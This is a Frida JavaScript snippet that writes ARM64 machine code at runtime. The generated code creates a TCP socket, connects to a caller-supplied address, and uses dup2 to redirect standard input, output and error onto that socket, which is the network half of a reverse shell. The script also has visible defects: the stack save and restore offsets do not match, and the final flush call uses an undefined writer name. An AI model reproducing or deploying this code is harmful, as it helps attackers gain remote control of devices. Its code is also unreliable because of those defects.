var impl = Memory.alloc(Process.pageSize);
Memory.patchCode(impl, Process.pageSize, function (code) {
  var arm64Writer = new Arm64Writer(code, { pc: impl });
  // SUB             SP, SP, #0x50
  arm64Writer.putSubRegRegImm('sp', 'sp', 0x50);
  // STP             X29, X30, [SP, #0x40]
  arm64Writer.putStpRegRegRegOffset('x29', 'x30', 'sp', 0x40, 'pre-adjust');
  // ADD             X29, SP, #0x40
  arm64Writer.putAddRegRegImm('x29', 'sp', 0x40);
  // STR             X0, [SP, #0x18]
  arm64Writer.putStrRegRegOffset('x0', 'sp', 0x18);
  // MOV             W0, #2
  arm64Writer.putInstruction(0x52800040);
  // MOV             W1, #1
  arm64Writer.putInstruction(0x52800021);
  // MOV             W2, WZR
  arm64Writer.putInstruction(0x2A1F03E2);
  arm64Writer.putCallAddressWithArguments(Module.findExportByName('libc.so', 'socket'), ['w0', 'w1', 'w2']);
  // STR             W0, [SP, #0x10]
  arm64Writer.putStrRegRegOffset('w0', 'sp', 0x10);
  // MOV             W2, #0x10
  arm64Writer.putInstruction(0x52800202);
  // LDR             X1, [SP, #0x18]
  arm64Writer.putLdrRegRegOffset('x1', 'sp', 0x18);
  arm64Writer.putCallAddressWithArguments(Module.findExportByName('libc.so', 'connect'), ['w0', 'x1', 'w2']);
  // LDR             W0, [SP, #0x10]
  arm64Writer.putLdrRegRegOffset('w0', 'sp', 0x10);
  // MOV             W1, WZR
  arm64Writer.putInstruction(0x2A1F03E1);
  arm64Writer.putCallAddressWithArguments(Module.findExportByName('libc.so', 'dup2'), ['w0', 'w1']);
  // LDR             W0, [SP, #0x10]
  arm64Writer.putLdrRegRegOffset('w0', 'sp', 0x10);
  // MOV             W1, #1
  arm64Writer.putInstruction(0x52800021);
  arm64Writer.putCallAddressWithArguments(Module.findExportByName('libc.so', 'dup2'), ['w0', 'w1']);
  // LDR             W0, [SP, #0x10]
  arm64Writer.putLdrRegRegOffset('w0', 'sp', 0x10);
  // MOV             W1, #2
  arm64Writer.putInstruction(0x52800041);
  arm64Writer.putCallAddressWithArguments(Module.findExportByName('libc.so', 'dup2'), ['w0', 'w1']);
  // LDP             X29, X30, [SP, #0x40]
  arm64Writer.putLdpRegRegRegOffset('x29', 'x30', 'sp', 0x20, 'pre-adjust');
  // ADD             SP, SP, #0x50
  arm64Writer.putAddRegRegImm('sp', 'sp', 0x50);
  // RET
  arm64Writer.putRet();
  armWriter.flush();
});
